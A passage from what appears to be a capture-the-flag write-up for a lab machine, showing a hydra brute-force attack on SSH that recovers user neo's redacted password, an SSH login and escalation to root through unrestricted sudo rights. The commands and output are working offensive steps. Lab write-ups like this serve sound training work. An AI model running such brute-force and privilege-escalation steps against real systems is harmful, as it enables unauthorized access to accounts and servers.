```

Then let's use `hydra` to brute force Neo's password.

```bash
hydra -l neo -P pass.txt -t 64 whiterabbit.htb ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-12 23:58:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000 login tries (l:1/p:1000), ~217 tries per task
[DATA] attacking ssh://whiterabbit.htb:22/
<SNIP>
[22][ssh] host: whiterabbit.htb   login: neo   password: WBS[REDACTED]
<SNIP>
```

Success! we got a password!
Let's ssh into neo and look around.

```bash
ssh neo@whiterabbit.htb
neo@whiterabbit.htbs password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Last login: Sat Apr 12 07:27:40 2025 from 10.10.14.12
neo@whiterabbit:~$
```

We can see that `neo` can run all commands as root.

```bash
neo@whiterabbit:~$ sudo -l
[sudo] password for neo:
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

Let's swap to the root user.

```bash
neo@whiterabbit:~$ sudo su
root@whiterabbit:/home/neo#
```

Just like that we have root.
